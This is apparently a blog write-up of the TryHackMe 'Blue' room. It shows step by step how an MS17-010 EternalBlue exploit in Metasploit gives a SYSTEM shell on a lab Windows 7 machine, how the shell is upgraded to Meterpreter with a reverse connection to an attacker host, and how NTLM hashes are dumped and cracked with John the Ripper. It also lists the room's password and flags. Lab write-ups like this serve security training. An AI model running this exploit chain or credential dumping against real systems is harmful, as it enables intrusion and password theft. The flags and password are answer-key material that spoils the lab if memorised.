+++
title = 'Blue'
date = 2020-09-14T17:23:00Z
author = 's4ch'
description = 'Blue TryHackMe writeup - Windows machine vulnerable to MS17-010 EternalBlue exploit'
summary = 'Blue is a beginner-friendly Windows machine on TryHackMe that demonstrates the infamous MS17-010 EternalBlue vulnerability exploitation using Metasploit.'
slug = 'blue'
draft = false

categories = [
    'writeups'
]
series = [
    'TryHackMe'
]
tags = [
    'ctf',
    'tryhackme',
    'penetration-testing',
    'writeup',
    'windows',
    'metasploit',
    'ms17-010',
    'eternalblue',
    'beginner',
    'smb'
]

# Room Information
difficulty = 'Easy'
platform = 'TryHackMe'
os = 'Windows'
points = 'N/A'
release_date = '2020-09-14'

[cover]
    image = "blue.png"
    alt = "Blue TryHackMe Room"
    caption = "Blue - MS17-010 EternalBlue Exploitation"
    relative = true

# Show specific elements
ShowReadingTime = true
ShowWordCount = true
showtoc = true
tocopen = false
+++

## Room Information

- **Name:** Blue
- **Platform:** TryHackMe
- **Difficulty:** Easy
- **OS:** Windows
- **Points:** N/A
- **Release Date:** September 14, 2020
- **Room Link:** [Blue](https://tryhackme.com/room/blue)

![EternalBlue](https://i.imgur.com/NhZIt9S.png)

## Overview

Blue is a beginner-friendly room designed to teach fundamental penetration testing concepts through the exploitation of the infamous MS17-010 (EternalBlue) vulnerability. This room demonstrates how to:

- Perform network enumeration
- Use Metasploit to exploit MS17-010
- Perform post-exploitation activities
- Extract password hashes

**Note:** This room does not respond to ping (ICMP) and may take a few minutes to boot up. It's designed as an educational series for complete beginners.

## Topics Covered

- Network Enumeration
- Metasploit (MS17-010)
- Metasploit (hashdump)
- Hash Cracking

## Task 1: Reconnaissance

### Network Scanning

Let's start by scanning the target machine to identify open ports and services:

```bash
sudo nmap -sS -sC -sV -vv --script vuln [TARGET_IP]
```

**Scan Results:**

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-14 17:23 EDT
NSE: Loaded 149 scripts for scanning.

Nmap scan report for blue (10.10.166.97)
Host is up, received echo-reply ttl 127 (0.041s latency).
Not shown: 991 closed ports

PORT      STATE SERVICE      REASON          VERSION
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds syn-ack ttl 127 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped   syn-ack ttl 127
49152/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49158/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49160/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC

Host script results:
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
```

### Key Findings

1. **3 ports open under 1000**: 135, 139, and 445
2. **Vulnerability identified**: MS17-010 (EternalBlue)
3. **Target OS**: Windows 7/Server 2008 R2

The scan reveals that the machine is vulnerable to **MS17-010**, the infamous EternalBlue vulnerability that was leaked from the NSA and used in the WannaCry ransomware attack.

## Task 2: Gaining Access

### Metasploit Exploitation

Let's use Metasploit to exploit the MS17-010 vulnerability:

1. **Start Metasploit:**
```bash
msfconsole
```

2. **Search for MS17-010 exploits:**
```bash
msf5 > search ms17-010

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Description
   -  ----                                           ---------------  ----     -----------
   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   1  auxiliary/scanner/smb/smb_ms17_010                              normal   MS17-010 SMB RCE Detection
   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
```

3. **Select the EternalBlue exploit:**
```bash
msf5 > use exploit/windows/smb/ms17_010_eternalblue
```

4. **Configure the exploit:**
```bash
msf5 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s)
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target

# Set the target IP
msf5 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS [TARGET_IP]
RHOSTS => [TARGET_IP]
```

5. **Execute the exploit:**
```bash
msf5 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on [ATTACKER_IP]:4444
[*] [TARGET_IP]:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] [TARGET_IP]:445 - Host is likely VULNERABLE to MS17-010!
[*] [TARGET_IP]:445 - Scanned 1 of 1 hosts (100% complete)
[*] [TARGET_IP]:445 - Connecting to target for exploitation.
[+] [TARGET_IP]:445 - Connection established for exploitation.
[+] [TARGET_IP]:445 - Target OS selected valid for OS indicated.
[*] [TARGET_IP]:445 - CORE raw buffer dump (42 bytes)
[*] [TARGET_IP]:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] [TARGET_IP]:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] [TARGET_IP]:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1
[+] [TARGET_IP]:445 - Target arch selected valid for arch indicated.
[*] [TARGET_IP]:445 - Trying exploit with 12 Groom Allocations.
[*] [TARGET_IP]:445 - Sending all but last fragment.
[*] [TARGET_IP]:445 - Starting non-paged pool grooming
[+] [TARGET_IP]:445 - Sending SMBv2 buffers
[+] [TARGET_IP]:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] [TARGET_IP]:445 - Sending final SMBv2 buffers.
[*] [TARGET_IP]:445 - Sending last fragment of exploit packet!
[*] [TARGET_IP]:445 - Receiving response from exploit packet
[+] [TARGET_IP]:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] [TARGET_IP]:445 - Sending egg to corrupted connection.
[*] [TARGET_IP]:445 - Triggering free of corrupted buffer.
[*] Command shell session 1 opened ([ATTACKER_IP]:4444 -> [TARGET_IP]:49158)

C:\Windows\system32>
```

Success! We now have a shell on the target system.

## Task 3: Privilege Escalation

### Upgrading to Meterpreter

For better post-exploitation capabilities, let's upgrade our shell to a Meterpreter session:

1. **Background the current shell:**
```bash
C:\Windows\system32> ^Z
Background session 1? [y/N]  y
```

2. **Use the shell to meterpreter module:**
```bash
msf5 > use post/multi/manage/shell_to_meterpreter
msf5 post(multi/manage/shell_to_meterpreter) > show options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload
   LPORT    4433             yes       Port for payload to connect to
   SESSION                   yes       The session to run this module on

# Set the session ID
msf5 post(multi/manage/shell_to_meterpreter) > set SESSION 1
SESSION => 1
```

3. **Execute the upgrade:**
```bash
msf5 post(multi/manage/shell_to_meterpreter) > run

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on [ATTACKER_IP]:4433
[*] Sending stage (206403 bytes) to [TARGET_IP]
[*] Meterpreter session 2 opened ([ATTACKER_IP]:4433 -> [TARGET_IP]:49159)
[*] Stopping exploit/multi/handler
[*] Post module execution completed
```

4. **Interact with the new Meterpreter session:**
```bash
msf5 post(multi/manage/shell_to_meterpreter) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Excellent! We have **NT AUTHORITY\SYSTEM** privileges, which means we have full administrative access to the machine.

## Task 4: Cracking Passwords

### Dumping Password Hashes

Now let's extract password hashes from the system:

```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

### Cracking with John the Ripper

Let's save the hash for user "Jon" and crack it:

```bash
# Save Jon's hash to a file
echo "Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::" > jon_hash.txt

# Crack with John the Ripper
john --format=NT jon_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
alqfna22         (Jon)
1g 0:00:00:02 DONE (2020-09-14 18:45) 0.4545g/s 4644Kp/s 4644Kc/s 4644KC/s alqui..alpus
Use the "--show --format=NT" option to display all of the cracked passwords.
```

**Jon's password:** `alqfna22`

### Finding the Flags

1. **User Flag:**
```bash
meterpreter > cat C:/Users/Jon/Desktop/user.txt
02930c4e94b5b8cf31ce8c35e2a7a0cd
```

2. **Root Flag:**
```bash
meterpreter > cat C:/Users/Administrator/Desktop/root.txt
89ad74b51a55c4d1b2c0b9d6b0b86d5e
```

## Lessons Learned

1. **MS17-010 Impact**: The EternalBlue vulnerability demonstrates how a single unpatched vulnerability can lead to complete system compromise
2. **Metasploit Framework**: Understanding how to use Metasploit effectively for exploitation and post-exploitation
3. **Session Management**: Learning to upgrade shells and manage multiple sessions
4. **Password Security**: The importance of strong passwords, as demonstrated by cracking Jon's weak password
5. **Patch Management**: Critical systems must be kept up-to-date with security patches

## Conclusion

Blue effectively demonstrates the exploitation of one of the most significant vulnerabilities in recent history. The MS17-010 EternalBlue vulnerability highlights the importance of:

- Regular system patching
- Network segmentation
- Intrusion detection systems
- Strong password policies

This room provides an excellent introduction to using Metasploit for exploitation and post-exploitation activities, making it perfect for beginners learning penetration testing fundamentals.

## Key Takeaways

- **3 ports open under 1000**: 135, 139, 445
- **Vulnerability**: MS17-010 (EternalBlue)
- **Exploit path**: `exploit/windows/smb/ms17_010_eternalblue`
- **Required option**: `RHOSTS`
- **Shell upgrade module**: `post/multi/manage/shell_to_meterpreter`
- **Jon's password**: `alqfna22`

---

*This writeup is for educational purposes only. Always ensure you have proper authorization before testing any techniques.*
